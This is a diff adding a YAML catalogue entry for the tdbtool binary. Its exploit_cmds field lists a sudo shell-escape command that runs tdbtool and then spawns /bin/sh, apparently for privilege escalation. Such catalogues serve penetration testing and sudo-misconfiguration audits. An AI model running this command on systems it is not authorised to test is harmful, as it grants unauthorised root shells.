@@ -1,0 +1,4 @@
+name: tdbtool
+binary_path: /usr/bin/tdbtool
+exploit_cmds:
+- sudo /usr/bin/tdbtool && ! /bin/sh
